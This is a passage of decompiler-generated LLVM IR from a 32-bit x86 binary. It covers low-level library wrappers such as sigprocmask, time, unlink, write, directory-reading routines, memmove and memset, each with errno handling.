  %v0_80523f7 = phi i32 [ %v1_80523e0, %dec_label_pc_80523d7 ], [ -1, %dec_label_pc_80523eb ]
  store i32 %v2_80523fb, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80523f7

; uselistorder directives
  uselistorder i32 %v1_80523e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80523f7, { 1, 0 }
}

define i32 @function_80523fd(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80523fd:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_80523fe = load i32, i32* @esi, align 4
  %v4_8052402 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8052402, i32* @ecx, align 4
  %v2_805240e = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_805240e, label %dec_label_pc_8052427, label %dec_label_pc_8052412

dec_label_pc_8052412:                             ; preds = %dec_label_pc_80523fd
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8052427, label %dec_label_pc_8052417

dec_label_pc_8052417:                             ; preds = %dec_label_pc_8052412
  %v1_8052417 = call i32 @function_80526c9(i32 %v0_80523fe)
  %v1_805241c = inttoptr i32 %v1_8052417 to i32*
  store i32 22, i32* %v1_805241c, align 4
  br label %dec_label_pc_805244e

dec_label_pc_8052427:                             ; preds = %dec_label_pc_8052412, %dec_label_pc_80523fd
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805242c = load i32, i32* @ebx, align 4
  %v7_8052434 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805242c, i32* @ebx, align 4
  store i32 %v7_8052434, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8052434, -4095
  br i1 %tmp12, label %dec_label_pc_805244e, label %dec_label_pc_8052440

dec_label_pc_8052440:                             ; preds = %dec_label_pc_8052427
  %v1_8052440 = call i32 @function_80526c9(i32 %v0_805242c)
  %v0_8052445 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052445 = sub i32 0, %v0_8052445
  %v2_8052447 = inttoptr i32 %v1_8052440 to i32*
  store i32 %v1_8052445, i32* %v2_8052447, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805244e

dec_label_pc_805244e:                             ; preds = %dec_label_pc_8052440, %dec_label_pc_8052427, %dec_label_pc_8052417
  %storemerge = phi i32 [ -1, %dec_label_pc_8052417 ], [ %v7_8052434, %dec_label_pc_8052427 ], [ -1, %dec_label_pc_8052440 ]
  %v2_805244e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805244e, i32* @edx, align 4
  store i32 %v0_80523fe, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8052434, { 1, 0, 2 }
  uselistorder i32 %v0_805242c, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8052452(i32* %arg1) local_unnamed_addr {
dec_label_pc_8052452:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052452 = load i32, i32* @edi, align 4
  store i32 %v0_8052452, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_805245a = load i32, i32* @ebx, align 4
  %v2_8052462 = call i32 @time(i32* %arg1)
  store i32 %v0_805245a, i32* @ebx, align 4
  store i32 %v2_8052462, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_8052462, -4095
  br i1 %tmp10, label %dec_label_pc_805247a, label %dec_label_pc_805246e

dec_label_pc_805246e:                             ; preds = %dec_label_pc_8052452
  %v1_805246e = call i32 @function_80526c9(i32 %v0_805245a)
  %v0_8052473 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052473 = sub i32 0, %v0_8052473
  %v2_8052475 = inttoptr i32 %v1_805246e to i32*
  store i32 %v1_8052473, i32* %v2_8052475, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805247e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805247a

dec_label_pc_805247a:                             ; preds = %dec_label_pc_8052452, %dec_label_pc_805246e
  %v2_805247e = phi i32 [ %v0_8052452, %dec_label_pc_8052452 ], [ %v2_805247e.pre, %dec_label_pc_805246e ]
  %v0_805247a = phi i32 [ %v2_8052462, %dec_label_pc_8052452 ], [ -1, %dec_label_pc_805246e ]
  %v2_805247c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805247c, i32* @edx, align 4
  store i32 %v2_805247e, i32* @edi, align 4
  ret i32 %v0_805247a

; uselistorder directives
  uselistorder i32 %v2_8052462, { 1, 0, 2 }
  uselistorder i32 %v0_805245a, { 1, 0 }
  uselistorder label %dec_label_pc_805247a, { 1, 0 }
}

define i32 @function_8052480() local_unnamed_addr {
dec_label_pc_8052480:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8052480 = load i32, i32* @edi, align 4
  store i32 %v0_8052480, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_8052488 = load i32, i32* @ebx, align 4
  %v1_8052489 = inttoptr i32 %tmp to i8*
  %v3_8052490 = call i32 @unlink(i8* %v1_8052489)
  store i32 %v0_8052488, i32* @ebx, align 4
  store i32 %v3_8052490, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052490, -4095
  br i1 %tmp9, label %dec_label_pc_80524a8, label %dec_label_pc_805249c

dec_label_pc_805249c:                             ; preds = %dec_label_pc_8052480
  %v1_805249c = call i32 @function_80526c9(i32 %v0_8052488)
  %v0_80524a1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80524a1 = sub i32 0, %v0_80524a1
  %v2_80524a3 = inttoptr i32 %v1_805249c to i32*
  store i32 %v1_80524a1, i32* %v2_80524a3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80524ac.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80524a8

dec_label_pc_80524a8:                             ; preds = %dec_label_pc_8052480, %dec_label_pc_805249c
  %v2_80524ac = phi i32 [ %v0_8052480, %dec_label_pc_8052480 ], [ %v2_80524ac.pre, %dec_label_pc_805249c ]
  %v0_80524a8 = phi i32 [ %v3_8052490, %dec_label_pc_8052480 ], [ -1, %dec_label_pc_805249c ]
  store i32 %v2_80524ac, i32* @edi, align 4
  ret i32 %v0_80524a8

; uselistorder directives
  uselistorder i32 %v3_8052490, { 1, 0, 2 }
  uselistorder i32 %v0_8052488, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80524a8, { 1, 0 }
}

define i32 @function_80524ae(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80524ae:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80524ae = load i32, i32* @edi, align 4
  store i32 %v0_80524ae, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80524be = load i32, i32* @ebx, align 4
  %v4_80524c6 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_80524c6, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_80524c6, -4095
  br i1 %tmp12, label %dec_label_pc_80524de, label %dec_label_pc_80524d2

dec_label_pc_80524d2:                             ; preds = %dec_label_pc_80524ae
  %v1_80524d2 = call i32 @function_80526c9(i32 %v0_80524be)
  %v0_80524d7 = load i32, i32* %edi.global-to-local, align 4
  %v1_80524d7 = sub i32 0, %v0_80524d7
  %v2_80524d9 = inttoptr i32 %v1_80524d2 to i32*
  store i32 %v1_80524d7, i32* %v2_80524d9, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80524e2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80524de

dec_label_pc_80524de:                             ; preds = %dec_label_pc_80524ae, %dec_label_pc_80524d2
  %v2_80524e2 = phi i32 [ %v0_80524ae, %dec_label_pc_80524ae ], [ %v2_80524e2.pre, %dec_label_pc_80524d2 ]
  %v0_80524de = phi i32 [ %v4_80524c6, %dec_label_pc_80524ae ], [ -1, %dec_label_pc_80524d2 ]
  store i32 %v2_80524e2, i32* %edi.global-to-local, align 4
  ret i32 %v0_80524de

; uselistorder directives
  uselistorder i32 %v4_80524c6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80524de, { 1, 0 }
}

define i32 @function_80524e4() local_unnamed_addr {
dec_label_pc_80524e4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_80524e4 = load i32, i32* @edi, align 4
  %v0_80524e5 = load i32, i32* @esi, align 4
  %v0_80524e6 = load i32, i32* @ebx, align 4
  %v12_80524e7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_80524ee = inttoptr i32 %tmp to i32*
  %v2_80524ee = load i32, i32* %v1_80524ee, align 4
  %v12_80524ee = icmp eq i32 %v2_80524ee, -1
  %v1_80524f1 = icmp eq i1 %v12_80524ee, false
  br i1 %v1_80524f1, label %dec_label_pc_8052503, label %dec_label_pc_80524f3

dec_label_pc_80524f3:                             ; preds = %dec_label_pc_80524e4
  %v1_80524f3 = call i32 @function_80526c9(i32 %v0_80524e6)
  %v1_80524f8 = inttoptr i32 %v1_80524f3 to i32*
  store i32 9, i32* %v1_80524f8, align 4
  br label %dec_label_pc_805254d

dec_label_pc_8052503:                             ; preds = %dec_label_pc_80524e4
  %v1_8052503 = add i32 %tmp, 24
  store i32 %v12_80524e7, i32* @esi, align 4
  %v2_8052512 = call i32 @function_8054050(i32 %v12_80524e7, i32 134561869)
  %v1_805251a = call i32 @function_805404d(i32 %v1_8052503)
  store i32 %v1_805251a, i32* @eax, align 4
  %v0_805251f = load i32, i32* @edi, align 4
  %v1_805251f = inttoptr i32 %v0_805251f to i32*
  %v2_805251f = load i32, i32* %v1_805251f, align 4
  store i32 %v2_805251f, i32* @ebx, align 4
  store i32 -1, i32* %v1_805251f, align 4
  %v2_805252c = call i32 @function_8054050(i32 %v12_80524e7, i32 1)
  %v0_8052532 = load i32, i32* @edi, align 4
  %v1_8052532 = add i32 %v0_8052532, 12
  %v2_8052532 = inttoptr i32 %v1_8052532 to i32*
  %v3_8052532 = load i32, i32* %v2_8052532, align 4
  %v1_8052535 = call i32 @function_80538e9(i32 %v3_8052532)
  %v0_805253a = load i32, i32* @edi, align 4
  %v1_805253d = call i32 @function_80538e9(i32 %v0_805253a)
  %v0_8052542 = load i32, i32* @ebx, align 4
  %v1_8052545 = call i32 @function_8052191(i32 %v0_8052542)
  br label %dec_label_pc_805254d

dec_label_pc_805254d:                             ; preds = %dec_label_pc_80524f3, %dec_label_pc_8052503
  %v0_8052553 = phi i32 [ -1, %dec_label_pc_80524f3 ], [ %v1_8052545, %dec_label_pc_8052503 ]
  store i32 %v0_80524e6, i32* @ebx, align 4
  store i32 %v0_80524e5, i32* @esi, align 4
  store i32 %v0_80524e4, i32* @edi, align 4
  ret i32 %v0_8052553

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805254d, { 1, 0 }
}

define i32 @function_8052554(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052554:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052554 = load i32, i32* @edi, align 4
  %v0_8052556 = load i32, i32* @ebx, align 4
  store i32 %v0_8052556, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_8052565 = inttoptr i32 %arg1 to i8*
  %v3_8052565 = call i32 @function_80522a2(i8* %v2_8052565, i32 67584)
  store i32 %v3_8052565, i32* %eax.global-to-local, align 4
  store i32 %v3_8052565, i32* @edi, align 4
  %v2_805256f = icmp slt i32 %v3_8052565, 0
  br i1 %v2_805256f, label %dec_label_pc_805263c, label %dec_label_pc_8052577

dec_label_pc_8052577:                             ; preds = %dec_label_pc_8052554
  %v0_8052577 = load i32, i32* @ebx, align 4
  %v2_8052579 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_8052579, i32* %eax.global-to-local, align 4
  store i32 %v3_8052565, i32* %stack_var_-124, align 4
  %v4_805257f = call i32 @function_805444a(i32 %v3_8052565, i32 %v2_8052579, i32 %v0_8052577, i32 %v0_8052577)
  store i32 %v4_805257f, i32* %eax.global-to-local, align 4
  %v2_8052587 = icmp slt i32 %v4_805257f, 0
  br i1 %v2_8052587, label %dec_label_pc_805259d, label %dec_label_pc_805258b

dec_label_pc_805258b:                             ; preds = %dec_label_pc_8052577
  %v0_8052590 = load i32, i32* @edi, align 4
  store i32 %v0_8052590, i32* %stack_var_-124, align 4
  %v3_8052591 = call i32 @function_80520cd(i32 %v0_8052590, i32 2, i32 1)
  store i32 %v3_8052591, i32* %eax.global-to-local, align 4
  %v2_8052599 = icmp slt i32 %v3_8052591, 0
  %v1_805259b = icmp eq i1 %v2_8052599, false
  br i1 %v1_805259b, label %dec_label_pc_80525b3, label %dec_label_pc_805259d

dec_label_pc_805259d:                             ; preds = %dec_label_pc_805258b, %dec_label_pc_8052577
  %v0_805259d = load i32, i32* %stack_var_-124, align 4
  %v1_805259d = call i32 @function_80526c9(i32 %v0_805259d)
  store i32 %v1_805259d, i32* %eax.global-to-local, align 4
  store i32 %v1_805259d, i32* @ebx, align 4
  %v1_80525a7 = inttoptr i32 %v1_805259d to i32*
  %v2_80525a7 = load i32, i32* %v1_80525a7, align 4
  %v0_80525a9 = load i32, i32* @edi, align 4
  store i32 %v0_80525a9, i32* %stack_var_-124, align 4
  %v1_80525aa = call i32 @function_8052191(i32 %v0_80525a9)
  store i32 %v1_80525aa, i32* %eax.global-to-local, align 4
  %v1_80525af = load i32, i32* @ebx, align 4
  %v2_80525af = inttoptr i32 %v1_80525af to i32*
  store i32 %v2_80525a7, i32* %v2_80525af, align 4
  br label %dec_label_pc_8052628

dec_label_pc_80525b3:                             ; preds = %dec_label_pc_805258b
  store i32 48, i32* %stack_var_-124, align 4
  %v1_80525b8 = call i32 @function_8052b24(i32 48)
  store i32 %v1_80525b8, i32* %eax.global-to-local, align 4
  store i32 %v1_80525b8, i32* @ebx, align 4
  %v1_80525c2 = icmp eq i32 %v1_80525b8, 0
  br i1 %v1_80525c2, label %dec_label_pc_8052614, label %dec_label_pc_80525c6

dec_label_pc_80525c6:                             ; preds = %dec_label_pc_80525b3
  %v0_80525c6 = load i32, i32* @edi, align 4
  %v2_80525c6 = inttoptr i32 %v1_80525b8 to i32*
  store i32 %v0_80525c6, i32* %v2_80525c6, align 4
  %v1_80525c8 = add i32 %v1_80525b8, 16
  %v2_80525c8 = inttoptr i32 %v1_80525c8 to i32*
  store i32 0, i32* %v2_80525c8, align 4
  %v1_80525cf = add i32 %v1_80525b8, 8
  %v2_80525cf = inttoptr i32 %v1_80525cf to i32*
  store i32 0, i32* %v2_80525cf, align 4
  %v1_80525d6 = add i32 %v1_80525b8, 4
  %v2_80525d6 = inttoptr i32 %v1_80525d6 to i32*
  store i32 0, i32* %v2_80525d6, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_80525e1 = load i32, i32* @ebx, align 4
  %v2_80525e1 = add i32 %v1_80525e1, 20
  %v3_80525e1 = inttoptr i32 %v2_80525e1 to i32*
  store i32 %tmp, i32* %v3_80525e1, align 4
  %v0_80525e4 = load i32, i32* %eax.global-to-local, align 4
  %v6_80525e9 = icmp ugt i32 %v0_80525e4, 511
  br i1 %v6_80525e9, label %dec_label_pc_80525f2, label %dec_label_pc_80525eb

dec_label_pc_80525eb:                             ; preds = %dec_label_pc_80525c6
  %v0_80525eb = load i32, i32* @ebx, align 4
  %v1_80525eb = add i32 %v0_80525eb, 20
  %v2_80525eb = inttoptr i32 %v1_80525eb to i32*
  store i32 512, i32* %v2_80525eb, align 4
  br label %dec_label_pc_80525f2

dec_label_pc_80525f2:                             ; preds = %dec_label_pc_80525c6, %dec_label_pc_80525eb
  %v0_80525f4 = load i32, i32* @ebx, align 4
  %v1_80525f4 = add i32 %v0_80525f4, 20
  %v2_80525f4 = inttoptr i32 %v1_80525f4 to i32*
  %v3_80525f4 = load i32, i32* %v2_80525f4, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_80525f9 = call i32 @function_8053298(i64 1, i32 %v3_80525f4)
  store i32 %v3_80525f9, i32* %eax.global-to-local, align 4
  %v1_8052601 = load i32, i32* @ebx, align 4
  %v2_8052601 = add i32 %v1_8052601, 12
  %v3_8052601 = inttoptr i32 %v2_8052601 to i32*
  store i32 %v3_80525f9, i32* %v3_8052601, align 4
  %v1_8052604 = icmp eq i32 %v3_80525f9, 0
  %v1_8052606 = icmp eq i1 %v1_8052604, false
  br i1 %v1_8052606, label %dec_label_pc_805262c, label %dec_label_pc_8052608

dec_label_pc_8052608:                             ; preds = %dec_label_pc_80525f2
  %v0_805260b = load i32, i32* @ebx, align 4
  store i32 %v0_805260b, i32* %stack_var_-124, align 4
  %v1_805260c = call i32 @function_80538e9(i32 %v0_805260b)
  store i32 %v1_805260c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052614

dec_label_pc_8052614:                             ; preds = %dec_label_pc_80525b3, %dec_label_pc_8052608
  %v0_8052617 = load i32, i32* @edi, align 4
  store i32 %v0_8052617, i32* %stack_var_-124, align 4
  %v1_8052618 = call i32 @function_8052191(i32 %v0_8052617)
  store i32 %v1_8052618, i32* %eax.global-to-local, align 4
  %v1_805261d = call i32 @function_80526c9(i32 %v0_8052617)
  store i32 %v1_805261d, i32* %eax.global-to-local, align 4
  %v1_8052622 = inttoptr i32 %v1_805261d to i32*
  store i32 12, i32* %v1_8052622, align 4
  br label %dec_label_pc_8052628

dec_label_pc_8052628:                             ; preds = %dec_label_pc_805259d, %dec_label_pc_8052614
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052639

dec_label_pc_805262c:                             ; preds = %dec_label_pc_80525f2
  %v0_805262e = load i32, i32* @ebx, align 4
  %v1_805262e = add i32 %v0_805262e, 24
  store i32 %v1_805262e, i32* %eax.global-to-local, align 4
  store i32 %v1_805262e, i32* %stack_var_-124, align 4
  %v1_8052634 = call i32 @function_805404d(i32 %v1_805262e)
  store i32 %v1_8052634, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052639

dec_label_pc_8052639:                             ; preds = %dec_label_pc_8052628, %dec_label_pc_805262c
  %v2_8052641.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805263c

dec_label_pc_805263c:                             ; preds = %dec_label_pc_8052554, %dec_label_pc_8052639
  %v2_8052641 = phi i32 [ %v0_8052556, %dec_label_pc_8052554 ], [ %v2_8052641.pre, %dec_label_pc_8052639 ]
  %v0_805263f = load i32, i32* @ebx, align 4
  store i32 %v0_805263f, i32* %eax.global-to-local, align 4
  store i32 %v2_8052641, i32* @ebx, align 4
  store i32 %v0_8052554, i32* @edi, align 4
  ret i32 %v0_805263f

; uselistorder directives
  uselistorder i32 %v3_80525f9, { 1, 0, 2 }
  uselistorder i32 %v1_80525b8, { 0, 3, 5, 4, 2, 1, 6 }
  uselistorder i32 %v1_805259d, { 1, 0, 2 }
  uselistorder i32 %v3_8052565, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_8053298, { 1, 0, 2 }
  uselistorder i32 512, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_8052191, { 12, 11, 6, 22, 21, 18, 17, 20, 16, 19, 15, 14, 13, 3, 5, 10, 9, 8, 7, 4, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805263c, { 1, 0 }
  uselistorder label %dec_label_pc_8052639, { 1, 0 }
  uselistorder label %dec_label_pc_8052628, { 1, 0 }
  uselistorder label %dec_label_pc_8052614, { 1, 0 }
  uselistorder label %dec_label_pc_80525f2, { 1, 0 }
}

define i32 @function_8052645() local_unnamed_addr {
dec_label_pc_8052645:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052645 = load i32, i32* @esi, align 4
  %v0_8052646 = load i32, i32* @ebx, align 4
  store i32 %v0_8052646, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_805264e = add i32 %tmp, 24
  store i32 %v1_805264e, i32* @ebx, align 4
  %v2_8052657 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8052657, i32* @eax, align 4
  %v2_805265c = call i32 @function_8054050(i32 %v2_8052657, i32 134561869)
  %v0_8052661 = load i32, i32* @ebx, align 4
  %v1_8052664 = call i32 @function_805404d(i32 %v0_8052661)
  br label %dec_label_pc_805266c

dec_label_pc_805266c:                             ; preds = %dec_label_pc_8052697, %dec_label_pc_8052645
  %v0_805266c = load i32, i32* @esi, align 4
  %v1_805266c = add i32 %v0_805266c, 8
  %v2_805266c = inttoptr i32 %v1_805266c to i32*
  %v3_805266c = load i32, i32* %v2_805266c, align 4
  %v2_805266f = add i32 %v0_805266c, 4
  %v3_805266f = inttoptr i32 %v2_805266f to i32*
  %v4_805266f = load i32, i32* %v3_805266f, align 4
  %v6_8052672 = icmp ugt i32 %v3_805266c, %v4_805266f
  br i1 %v6_8052672, label %dec_label_pc_8052697, label %dec_label_pc_8052674

dec_label_pc_8052674:                             ; preds = %dec_label_pc_805266c
  %v0_8052674 = load i32, i32* @edx, align 4
  %v1_8052675 = add i32 %v0_805266c, 20
  %v2_8052675 = inttoptr i32 %v1_8052675 to i32*
  %v3_8052675 = load i32, i32* %v2_8052675, align 4
  %v1_8052678 = add i32 %v0_805266c, 12
  %v2_8052678 = inttoptr i32 %v1_8052678 to i32*
  %v3_8052678 = load i32, i32* %v2_8052678, align 4
  %v1_805267b = inttoptr i32 %v0_805266c to i32*
  %v2_805267b = load i32, i32* %v1_805267b, align 4
  %v4_805267d = call i32 @function_8054492(i32 %v2_805267b, i32 %v3_8052678, i32 %v3_8052675, i32 %v0_8052674)
  %tmp12 = icmp slt i32 %v4_805267d, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_805268d, label %dec_label_pc_8052689

dec_label_pc_8052689:                             ; preds = %dec_label_pc_8052674
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80526b3

dec_label_pc_805268d:                             ; preds = %dec_label_pc_8052674
  %v1_805268d = load i32, i32* @esi, align 4
  %v2_805268d = add i32 %v1_805268d, 8
  %v3_805268d = inttoptr i32 %v2_805268d to i32*
  store i32 %v4_805267d, i32* %v3_805268d, align 4
  %v0_8052690 = load i32, i32* @esi, align 4
  %v1_8052690 = add i32 %v0_8052690, 4
  %v2_8052690 = inttoptr i32 %v1_8052690 to i32*
  store i32 0, i32* %v2_8052690, align 4
  %v0_8052697.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052697

dec_label_pc_8052697:                             ; preds = %dec_label_pc_805266c, %dec_label_pc_805268d
  %v1_80526a5 = phi i32 [ %v0_805266c, %dec_label_pc_805266c ], [ %v0_8052697.pre, %dec_label_pc_805268d ]
  %v1_8052697 = add i32 %v1_80526a5, 4
  %v2_8052697 = inttoptr i32 %v1_8052697 to i32*
  %v3_8052697 = load i32, i32* %v2_8052697, align 4
  %v2_805269c = add i32 %v1_80526a5, 12
  %v3_805269c = inttoptr i32 %v2_805269c to i32*
  %v4_805269c = load i32, i32* %v3_805269c, align 4
  %v5_805269c = add i32 %v4_805269c, %v3_8052697
  store i32 %v5_805269c, i32* @ebx, align 4
  %v1_805269f = add i32 %v5_805269c, 8
  %v2_805269f = inttoptr i32 %v1_805269f to i16*
  %v3_805269f = load i16, i16* %v2_805269f, align 2
  %v4_805269f = zext i16 %v3_805269f to i32
  store i32 %v4_805269f, i32* @edx, align 4
  %v2_80526a3 = add i32 %v4_805269f, %v3_8052697
  store i32 %v2_80526a3, i32* %v2_8052697, align 4
  %v0_80526a8 = load i32, i32* @ebx, align 4
  %v1_80526a8 = add i32 %v0_80526a8, 4
  %v2_80526a8 = inttoptr i32 %v1_80526a8 to i32*
  %v3_80526a8 = load i32, i32* %v2_80526a8, align 4
  %v1_80526ab = load i32, i32* @esi, align 4
  %v2_80526ab = add i32 %v1_80526ab, 16
  %v3_80526ab = inttoptr i32 %v2_80526ab to i32*
  store i32 %v3_80526a8, i32* %v3_80526ab, align 4
  %v0_80526ae = load i32, i32* @ebx, align 4
  %v1_80526ae = inttoptr i32 %v0_80526ae to i32*
  %v2_80526ae = load i32, i32* %v1_80526ae, align 4
  %v3_80526ae = icmp eq i32 %v2_80526ae, 0
  br i1 %v3_80526ae, label %dec_label_pc_805266c, label %dec_label_pc_80526b3.loopexit

dec_label_pc_80526b3.loopexit:                    ; preds = %dec_label_pc_8052697
  br label %dec_label_pc_80526b3

dec_label_pc_80526b3:                             ; preds = %dec_label_pc_80526b3.loopexit, %dec_label_pc_8052689
  store i32 %v2_8052657, i32* @eax, align 4
  %v2_80526bc = call i32 @function_8054050(i32 %v2_8052657, i32 1)
  %v0_80526c1 = load i32, i32* @ebx, align 4
  %v2_80526c6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80526c6, i32* @ebx, align 4
  store i32 %v0_8052645, i32* @esi, align 4
  ret i32 %v0_80526c1

; uselistorder directives
  uselistorder i32 %v1_80526a5, { 1, 0 }
  uselistorder i32 %v0_805266c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8052697, { 1, 0 }
}

define i32 @function_80526c9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80526c9:
  ret i32 ptrtoint (i32* @global_var_8056914.203 to i32)
}

define i32 @function_80526cf() local_unnamed_addr {
dec_label_pc_80526cf:
  %tmp = call i64 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %v1_80526d7 = bitcast i32* %stack_var_-16 to %tms*
  %v2_80526d7 = call i32 @function_8054867(%tms* %v1_80526d7)
  %v4_80526dc = trunc i64 %tmp to i32
  %v4_80526e0 = load i32, i32* %stack_var_-16, align 4
  %v5_80526e0 = add i32 %v4_80526e0, %v4_80526dc
  %v3_80526e7 = mul i32 %v5_80526e0, 10000
  %v1_80526ed = and i32 %v3_80526e7, 2147483632
  ret i32 %v1_80526ed

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_80526f3(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80526f3:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80526f4 = load i32, i32* @esi, align 4
  store i32 %v0_80526f4, i32* %stack_var_-8, align 4
  %v4_80526f5 = ptrtoint i8* %arg1 to i32
  %v9_8052701 = icmp ugt i8* %tmp3, %arg1
  %v1_8052703 = icmp eq i1 %v9_8052701, false
  br i1 %v1_8052703, label %dec_label_pc_805270b, label %dec_label_pc_8052705

dec_label_pc_8052705:                             ; preds = %dec_label_pc_80526f3
  %v7_8052707 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_8052717

dec_label_pc_805270b:                             ; preds = %dec_label_pc_80526f3
  %v3_805270b = add i32 %arg2, -1
  %v4_805270b = add i32 %v3_805270b, %arg3
  %v5_805270b = inttoptr i32 %v4_805270b to i8*
  %v3_805270f = add i32 %v4_80526f5, -1
  %v4_805270f = add i32 %v3_805270f, %arg3
  %v5_805270f = inttoptr i32 %v4_805270f to i8*
  %v7_8052714 = call i8* @_memcpy(i8* %v5_805270f, i8* %v5_805270b, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8052717

dec_label_pc_8052717:                             ; preds = %dec_label_pc_8052705, %dec_label_pc_805270b
  %v2_8052717 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052717, i32* @esi, align 4
  ret i32 %v4_80526f5

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052717, { 1, 0 }
}

define i32 @function_805271a(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805271a:
  %v0_805271a = load i32, i32* @edi, align 4
  %v4_8052723 = ptrtoint i8* %arg1 to i32
  %v5_8052727 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805271a, i32* @edi, align 4
  ret i32 %v4_8052723

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_805272f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805272f:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052732 = ptrtoint i32* %stack_var_-4 to i32
